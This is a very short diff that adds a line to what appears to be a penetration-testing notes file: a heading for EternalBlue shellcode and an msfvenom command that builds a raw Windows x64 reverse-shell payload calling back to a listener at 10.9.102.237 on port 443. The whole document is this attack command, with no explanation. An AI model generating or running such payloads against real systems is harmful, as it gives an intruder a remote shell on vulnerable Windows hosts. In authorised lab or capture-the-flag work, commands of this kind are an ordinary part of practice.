@@ -1,0 +1,3 @@
+
+# SHELCODE (EternalBlue)
+msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.9.102.237 LPORT=443
